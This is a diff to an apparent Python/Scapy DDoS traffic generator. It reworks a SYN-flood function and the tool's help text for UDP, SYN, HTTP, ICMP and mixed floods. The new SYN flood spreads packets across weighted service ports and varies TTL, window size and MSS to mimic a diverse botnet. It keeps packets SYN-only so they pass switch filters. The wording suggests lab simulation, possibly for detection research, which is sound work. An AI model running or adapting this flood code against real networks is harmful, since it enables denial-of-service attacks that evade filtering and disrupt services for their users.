@@ -57,29 +57,62 @@ def generate_udp_flood(src_ip, dst_ip, src_mac, dst_mac, num_packets):
 
 def generate_syn_flood(src_ip, dst_ip, src_mac, dst_mac, num_packets):
     """
-    Generate SYN flood attack (TCP SYN only, no handshake completion)
+    Generate VARIED SYN flood attack (multiple attack vectors, all using TCP SYN)
 
-    Characteristics:
-    - SYN packets only (no ACK)
-    - Random source ports
-    - Target common services (HTTP, HTTPS, SSH, etc.)
-    - Random sequence numbers
+    Simulates multiple DDoS attack types, but all using SYN packets to pass switch filters:
+    - HTTP flood: SYN to port 80/443/8080 (40%)
+    - SSH flood: SYN to port 22/2222 (20%)
+    - HTTPS flood: SYN to port 443/8443 (20%)
+    - Telnet flood: SYN to port 23/2323 (10%)
+    - Custom services flood: SYN to ports 3389/5060/8000 (10%)
+
+    All are SYN-only (no handshake) to pass switch, but vary in:
+    - Target ports (simulates different attack vectors)
+    - Window sizes (simulates different botnet clients)
+    - Sequence numbers (randomized)
+    - TTL values (simulates geographic distribution)
     """
     packets = []
 
-    # Common Mirai target ports for SYN flood
-    target_ports = [22, 23, 80, 443, 2323, 8080, 8443]
+    # Attack vectors (port groups simulating different DDoS types)
+    attack_vectors = [
+        # HTTP flood simulation (40%)
+        {'ports': [80, 8080, 8000], 'weight': 40, 'name': 'HTTP'},
+        # HTTPS flood simulation (20%)
+        {'ports': [443, 8443], 'weight': 20, 'name': 'HTTPS'},
+        # SSH brute-force flood simulation (20%)
+        {'ports': [22, 2222], 'weight': 20, 'name': 'SSH'},
+        # Telnet flood simulation (10%)
+        {'ports': [23, 2323], 'weight': 10, 'name': 'Telnet'},
+        # RDP/SIP flood simulation (10%)
+        {'ports': [3389, 5060], 'weight': 10, 'name': 'RDP/SIP'},
+    ]
+
+    # Create weighted list for random selection
+    attack_list = []
+    for vector in attack_vectors:
+        attack_list.extend([vector] * vector['weight'])
+
+    # Different window sizes (simulates diverse botnet)
+    window_sizes = [8192, 16384, 32768, 65535, 5840, 14600, 29200]
+
+    # TTL values (simulates geographic diversity)
+    ttl_values = [64, 128, 255, 32, 60, 120, 200]
 
     for i in range(num_packets):
-        target_port = random.choice(target_ports)
+        # Select attack vector (weighted random)
+        vector = random.choice(attack_list)
+        target_port = random.choice(vector['ports'])
 
+        # Vary packet characteristics for realism
         pkt = Ether(src=src_mac, dst=dst_mac) / \
-              IP(src=src_ip, dst=dst_ip) / \
+              IP(src=src_ip, dst=dst_ip, ttl=random.choice(ttl_values)) / \
               TCP(sport=random.randint(1024, 65535),
                   dport=target_port,
-                  flags='S',  # SYN flag only
+                  flags='S',  # SYN flag only (passes switch)
                   seq=random.randint(1000, 4000000000),
-                  window=random.choice([8192, 16384, 32768, 65535]))
+                  window=random.choice(window_sizes),
+                  options=[('MSS', random.choice([1460, 1380, 1400]))])  # Vary MSS
 
         packets.append(pkt)
 
@@ -329,11 +362,14 @@ def main():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Attack Types:
-  udp    - UDP flood (classic Mirai, targets DNS, NTP, etc.)
-  syn    - SYN flood (TCP SYN only, no handshake)
-  http   - HTTP GET flood (application layer)
-  icmp   - ICMP flood (ping flood)
-  mixed  - Mixed attack (40%% UDP, 30%% SYN, 20%% HTTP, 10%% ICMP)
+  udp    - UDP flood (DNS queries only - switch-safe)
+  syn    - VARIED SYN flood (simulates HTTP/HTTPS/SSH/Telnet/RDP floods via SYN packets)
+           40%% HTTP (ports 80/8080), 20%% HTTPS (443/8443), 20%% SSH (22/2222),
+           10%% Telnet (23/2323), 10%% RDP/SIP (3389/5060)
+           All use SYN-only to pass switch filters
+  http   - HTTP GET flood (full handshake - may be blocked by switch)
+  icmp   - ICMP flood (standard ping - may be blocked by switch)
+  mixed  - Mixed SYN-based attack (60%% varied SYN, 20%% DNS, 10%% HTTP, 10%% ICMP)
 
 Examples:
   # UDP flood with 5M packets
